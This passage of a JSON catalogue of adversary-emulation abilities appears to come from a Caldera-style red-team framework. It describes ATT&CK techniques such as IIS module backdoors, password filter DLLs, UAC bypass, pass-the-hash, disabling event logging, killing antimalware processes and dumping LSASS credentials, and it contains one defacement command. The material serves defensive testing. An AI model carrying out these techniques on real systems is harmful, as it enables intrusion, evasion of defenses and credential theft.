        "privilege": "",
        "technique_name": "Event Triggered Execution: AppInit DLLs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install AppInit Shim",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "37355813cce32de2f3f6e5c6208f7b4d",
        "technique_id": "T1546.010",
        "repeatable": false
    },
    {
        "description": "The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "IIS Components",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install IIS Module using AppCmd.exe",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "231b7dd1e4747af98c35602340a1b6bf",
        "technique_id": "T1505.004",
        "repeatable": false
    },
    {
        "description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "IIS Components",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install IIS Module using PowerShell Cmdlet New-WebGlobalModule",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "e8c24e75714483eb3b526fc589a88f9a",
        "technique_id": "T1505.004",
        "repeatable": false
    },
    {
        "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Server Software Component: Transport Agent",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install MS Exchange Transport Agent Persistence",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "b00d08275bb2b3ef620e103b1fd7b9e4",
        "technique_id": "T1505.002",
        "repeatable": false
    },
    {
        "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Office Application Startup: Outlook Home Page",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install Outlook Home Page Persistence",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "5542d8580c8a1380595d61f8c4095031",
        "technique_id": "T1137.004",
        "repeatable": false
    },
    {
        "description": "Download and install PSTools by unzipping the file",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install PSTools",
        "tactic": "command-and-control",
        "plugin": "stockpile",
        "ability_id": "eb814e03-811a-467a-bc6d-dcd453750fa2",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Download, install and start new process under PowerShell Core 6",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install PowerShell Core 6",
        "tactic": "command-and-control",
        "plugin": "stockpile",
        "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Authentication Process: Password Filter DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install and Register Password Filter DLL",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "efc885d494a744745a149ad2802e7403",
        "technique_id": "T1556.002",
        "repeatable": false
    },
    {
        "description": "Creates a root CA with Powershell\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Install Root Certificate",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install root CA on Windows",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "51ddafefb92c9dfcb6ce3369e7316bf3",
        "technique_id": "T1553.004",
        "repeatable": false
    },
    {
        "description": "Creates a root CA with certutil\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Install Root Certificate",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install root CA on Windows with certutil",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2cdcf1010a524231a26b5f3c6025eb91",
        "technique_id": "T1553.004",
        "repeatable": false
    },
    {
        "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallHelper method call",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c129aca94d1d22aad238ee07f5db7813",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallUtil HelpText method call",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8546aa1934a705574c7591af340e0251",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallUtil Install method call",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e0edd5aef59c72e31fb14e12a26a5066",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f30d3e0b387703e1a2eafd31b9103434",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallUtil Uninstall method call - /U variant",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ebd726fe1e5462434f28d632424f86e5",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallUtil class constructor method call",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "492807a41cd2991f59acf9d615e46682",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InstallUtil evasive invocation",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "10a8f500acd733bb4732b9a5236d50b2",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "Determine the version of Internet Explorer running",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Internet Explorer Version",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke CHM Shortcut Command with ITS and Help Topic",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ae1510936a20ac31014eb86e5b4944ce",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Executes a CHM file simulating a user double click.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke CHM Simulate Double click",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "4c378a952a9235b7aba7f273f3cf4874",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Executes a CHM file with the ITS protocol handler.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke CHM with InfoTech Storage Protocol Handler",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5b1aea789aa50c07bb5555dcff5d42a6",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke CHM with Script Engine and Help Topic",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "627f499ceb32e74b95494141bc680e08",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Executes a CHM file with the default Shortcut Command method.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke CHM with default Shortcut Command Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0d2e984bedf73f5266e250d7ecd257cf",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Executes an HTA Application by directly downloading from remote URI.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke HTML Application - Direct download from URI",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "748882eaad1b31e8f90d9b31692200fe",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "35200ef3d7ca094ae2208a1df03ede18",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0bb6fa90a458e6512a19d246cfae8843",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Executes an HTA Application using JScript script engine simulating double click.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke HTML Application - Jscript Engine Simulating Double Click",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d143172642328567d9d0951cb116e3a2",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bf9cc3d98c38f79c948a0f4a7f888034",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c29f0da7c0bf612d30acb64e1d6e9368",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "085858a8aa5ea8e6a810e59c75ea7f6a",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke-AppPathBypass",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "d56753da33c882128773634140c0efa5",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Downloads random meme and sets as desktop background",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Defacement",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke-MemeKatz",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "68235976-2404-42a8-9105-68230cfef562",
        "technique_id": "T1491",
        "repeatable": false
    },
    {
        "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Use Alternate Authentication Material: Pass the Hash",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Invoke-WMIExec Pass the Hash",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "8ce073cf3170576e1f5c6e4d06e1873a",
        "technique_id": "T1550.002",
        "repeatable": false
    },
    {
        "description": "JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\\T1059.007.out.txt",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: JavaScript",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "JScript execution to gather local computer information via cscript",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "d01777fabe1567d53f720d0d4e348c33",
        "technique_id": "T1059.007",
        "repeatable": false
    },
    {
        "description": "JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: JavaScript",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "JScript execution to gather local computer information via wscript",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "88210b707791d09a7db8026d521f71b1",
        "technique_id": "T1059.007",
        "repeatable": false
    },
    {
        "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Javascript in registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6722535bf5a14b87b5772b739f53321f",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Kerbrute - userenum",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "25bbb222a91d007fa29ace7c586b418c",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Kill Event Log Service Threads",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "47ba984c0c40a7c41b4797156c1a5f96",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Kill antimalware protected processes using Backstab",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6a4f5aca52680eef33a8285782936333",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LLMNR Poisoning with Inveigh (PowerShell)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5ee8fce78c4cef28c4e6ecebe77bdba4",
        "technique_id": "T1557.001",
        "repeatable": false
    },
    {
        "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LNK Payload Download",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "f71199dcf1e307fc37c5a0cb9e4031b9",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LSASS read with pypykatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "03526668cc55b6544244b107feadaf22",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LaZagne - Credentials from Browser",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "bead649d4e8d5e0f507e8e71914724db",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Uses CertUtil as a LoL technique to move the .exe agent as a certificate using windows-signed binaries",
        "buckets": [],
        "additional_info": {
            "cleanup": "[]"
        },
        "privilege": "",
        "technique_name": "Lateral Tool Transfer",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_agent_copy"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.not_exists"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.no_backwards_movement"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lateral Movement - Certutil",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "96d3c175-5e58-424c-8350-d7514b28a075",
        "technique_id": "T1570",
        "repeatable": false
    },
    {
        "description": "Tool transfer to lateral hosts using Alternate Data Streams to hide implant",
        "buckets": [],
        "additional_info": {
            "cleanup": "[]"
        },
        "privilege": "",
        "technique_name": "Hide Artifacts: NTFS File Attributes",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_agent_copy"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.not_exists"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.no_backwards_movement"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lateral Movement - esentutl",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "22881b9d-0efa-4ef4-9704-df0f11170cc3",
        "technique_id": "T1564.004",
        "repeatable": false
    },
    {
        "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Launch DirLister Executable",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e658d2552728a97b1a3c70838176c94d",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Launch NSudo Executable",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "290915ea4ec9fae461442bd89d9d8098",
        "technique_id": "T1134.001",
        "repeatable": false
    },
    {
        "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Launches an executable using Rundll32 and pcwutl.dll",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6a411cadf7c87edcb445422ce6785550",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Create a text file for the user to find",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Defacement",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo \"proof that this machine was hacked.\" > message.txt",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Leave note",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9",
        "technique_id": "T1491",
        "repeatable": false
    },
    {
        "description": "Dump lsass for later use with mimikatz",
        "buckets": [
            "credential-access"
